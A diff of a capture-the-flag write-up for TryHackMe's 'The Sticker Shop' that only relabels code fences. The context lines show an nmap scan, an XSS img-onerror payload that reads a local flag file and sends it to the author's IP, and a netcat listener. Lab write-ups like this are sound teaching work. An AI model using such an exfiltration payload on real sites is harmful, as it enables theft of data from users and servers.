@@ -30,7 +30,7 @@ Can you read the flag at http://MACHINE_IP:8080/flag.txt?
 
 For reconnaissance, we're going to run a quick port scan on the machine's IP.
 
-```tmux
+```bash
 nmap -F 10.129.180.138
 ```
 ![Port scan to see what kind of machine we're dealing with](/images/writeups/TryHackMe_imágenes/The_Sticker_Shop_THM_imágenes/Nmap_ip_The_Sticker_Shop.png)
@@ -77,7 +77,7 @@ And here's the key hint from the challenge description: "they host everything on
 
 Knowing this, I'm going to craft a payload that, when executed in the machine's browser, reads the flag from `localhost:8080/flag.txt` (which only that machine has access to) and sends it to me via a request to a server — in this case, my own machine using NetCat.
 
-```tmux
+```bash
 <img src=x onerror="fetch('http://127.0.0.1:8080/flag.txt').then(r=>r.text()).then(d=>fetch('http://192.168.134.213:8000/?data='+d))">
 ```
 
@@ -90,7 +90,7 @@ In short, here's what this payload does:
 
 But for this payload to work, I need to set up a listener to catch whatever it sends us; for that I'll use netcat.
 
-```tmux
+```bash
 nc -lnvp 8000
 ```
 
